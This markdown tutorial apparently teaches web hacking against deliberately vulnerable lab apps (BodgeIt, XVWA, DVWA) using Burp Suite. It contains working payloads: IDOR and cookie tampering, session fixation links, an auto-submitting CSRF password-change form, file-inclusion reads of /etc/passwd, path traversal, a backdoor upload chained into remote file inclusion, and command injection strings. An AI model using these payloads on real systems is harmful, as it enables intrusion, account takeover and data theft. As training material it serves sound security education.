# Web hacking for Lo Teks

You will only need :
1. [Burp Suite Community Edition_](https://portswigger.net/burp/communitydownload) - choose "*Download plain JAR file*"
2. Optional for your comfort - a plugin to switch proxy setting for your browser, like **FoxyProxy** for [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp) or [Firefox](https://addons.mozilla.org/sk/firefox/addon/foxyproxy-standard/)

Now you need to read [this](http://www.phrack.org/issues/7/3.html) and start your `BurpSuite`

`java -jar burpsuite_community_v1.7.36.jar`

List of apps to play with:
* [The BodgeIt Store](http://bodgeit.lab/bodgeit/)
* [Xtreme Vulnerable Web Application (XVWA)](http://xvwa.lab/xvwa/)
* [Damn Vulnerable Web Application (DVWA)](http://dvwa.lab/)


## Broken Access Control

With a little bit of *Insecure Direct Object References (IDOR)*

### BodgeIt Admin interface

If there is no **admin** section in the menu, it doesn't mean there is none.

but you can [guess](http://bodgeit.lab/bodgeit/admin.jsp)

`http://bodgeit.lab/bodgeit/admin.jsp`


### BodgeIt Debug Messages

Wish there was some magic switch to show some sensitive stuff.

No problem. Try something like [this])http://bodgeit.lab/bodgeit/basket.jsp?debug=true)

`http://bodgeit.lab/bodgeit/basket.jsp?debug=true`


### Client-side data validation

`Proxy > Options > Response Modification > Remove JavaScript form validation`

### I can see what you buy

1. Visit [BodgeIt basket](http://bodgeit.lab/bodgeit/basket.jsp)
2. Change your cookie `Cookie: b_id=3;`
3. Refresh the page

### Insecure Direct Object References (IDOR)

WAT? Lets have look [here](http://xvwa.lab/xvwa/vulnerabilities/idor/).

We only have a `Café au lait`

`http://xvwa.lab/xvwa/vulnerabilities/idor/?item=5`

But I want to order a `Caffé latte`

`http://xvwa.lab/xvwa/vulnerabilities/idor/?item=7`


### What if i change this ...

You can test it [here](http://xvwa.lab/xvwa/vulnerabilities/missfunc/).

If you can *view*

`http://xvwa.lab/xvwa/vulnerabilities/missfunc/?item=10&action=view`

maybe you can do more

`http://xvwa.lab/xvwa/vulnerabilities/missfunc/?item=10&action=delete`


## Broken Authentication and Session Management


### SESSIONID

What are all these random letters numbers? Well, they really are (should be) random ;]
But remember
> Keep It Hidden Keep It Safe

### Session fixation 

Easy as sending a [link](http://bodgeit.lab/bodgeit/login.jsp?JSESSIONID=0CE01A16F33AC52D89705BC9A088E0AF) to someone.

`http://bodgeit.lab/bodgeit/login.jsp?JSESSIONID=0CE01A16F33AC52D89705BC9A088E0AF`




## Cross-Site Request Forgery (CSRF)

[This](http://xvwa.lab/xvwa/vulnerabilities/csrf/) is how a bad idea looks like.

`http://xvwa.lab/xvwa/vulnerabilities/csrf/?passwd=heslo&confirm=heslo&submit=submit`


BodgeIt : leave feedback to change passwords

`<img src='http://bodgeit.lab/bodgeit/password.jsp?password1=heslo&password2=heslo'>`

```
<form action="http://bodgeit.lab/bodgeit/password.jsp" method="POST">
  <input type="hidden" name="password1" value="heslo" />
  <input type="hidden" name="password2" value="heslo" />
  <input type="submit" value="Submit request" />
</form>
<script>document.forms[0].submit();</script>

```

## Insecure Direct Object References (IDOR) - again...

Yes, it can be bad, check [this](http://xvwa.lab/xvwa/vulnerabilities/fi/)

You show me `readme.txt`

`http://xvwa.lab/xvwa/vulnerabilities/fi/?file=readme.txt`

but I want to see `/etc/passwd`

`http://xvwa.lab/xvwa/vulnerabilities/fi/?file=/etc/passwd`


Same as [here](http://dvwa.lab/vulnerabilities/fi/?page=include.php)

Oh no, a file include

`http://dvwa.lab/vulnerabilities/fi/?page=file1.php`

with a bonus

`http://dvwa.lab/vulnerabilities/fi/?page=file4.php`

but we want more!

`http://dvwa.lab/vulnerabilities/fi/?page=../../phpinfo.php`


Or you can upload your own backdoor using the [image upload](http://dvwa.lab/vulnerabilities/upload) to

`../../hackable/uploads/phpinfo.txt`

and then access it as

`http://dvwa.lab/hackable/uploads/phpinfo.txt`


So let's turn LFI into RFI

`http://xvwa.lab/xvwa/vulnerabilities/fi/?file=http://DVWA/hackable/uploads/phpinfo.txt`

Use the `DVWA` hostname instead of `dvwa.lab` because of the docker setup.


## Injection

Let's do some real **hacking**, I want a **shell**!

## Command Injection

Ok, [Let's go!](`http://dvwa.lab/dvwa/vulnerabilities/exec/`)

`http://dvwa.lab/dvwa/vulnerabilities/exec/`

or

`http://xvwa.lab/xvwa/vulnerabilities/cmdi/`

```
127.0.0.1;id
127.0.0.1&id
x||id
```

```
POST /dvwa/vulnerabilities/exec/ HTTP/1.1
Host: dvwa.lab
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dvwa.lab/dvwa/vulnerabilities/exec/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Cookie: security=high; PHPSESSID=1mdh1pt8dt42taesnorvlh9og2
Upgrade-Insecure-Requests: 1

ip=127.0.0.1%0d%0Aid&Submit=Submit
```